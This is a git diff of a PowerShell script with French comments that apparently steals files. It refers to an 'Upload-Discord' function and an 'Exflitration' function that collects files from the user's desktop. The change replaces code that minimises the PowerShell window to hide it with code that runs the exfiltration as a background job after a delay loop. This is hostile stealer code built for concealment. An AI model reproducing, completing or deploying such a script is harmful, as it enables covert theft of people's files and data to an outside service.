@@ -22,6 +22,11 @@ function Upload-Discord {
 }
 
 # Créer un scriptblock pour la fonction Exfiltration
+$ExfiltrationScript = {
+    Exfiltration
+}
+
+# Fonction Exfiltration
 function Exflitration {
     # Get desktop path
     $desktop = [Environment]::GetFolderPath("Desktop")
@@ -112,19 +117,18 @@ function Exflitration {
         exit
     }
     
-# Récupérer le handle de la fenêtre PowerShell
-$handle = (Get-Process -PID $PID).MainWindowHandle
+# Lancer la fonction Exfiltration en arrière-plan
+$ExfiltrationJob = Start-Job -ScriptBlock $ExfiltrationScript
+# Boucle principale
+do {
+    # Attendre une seconde avant de vérifier à nouveau
+    Start-Sleep -Seconds 1
 
-# Minimiser la fenêtre
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class User32 {
-        [DllImport("user32.dll")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    }
-"@
-[User32]::ShowWindow($handle, 6)  # 6 représente SW_MINIMIZE
+    # Vérifier si le délai est écoulé
+} until (Delai-ecoule)
 
-Exflitration
+# Attendre que le job Exfiltration soit terminé
+Wait-Job $ExfiltrationJob | Out-Null
+
+# Récupérer les résultats du job si nécessaire
+$ExfiltrationResults = Receive-Job $ExfiltrationJob
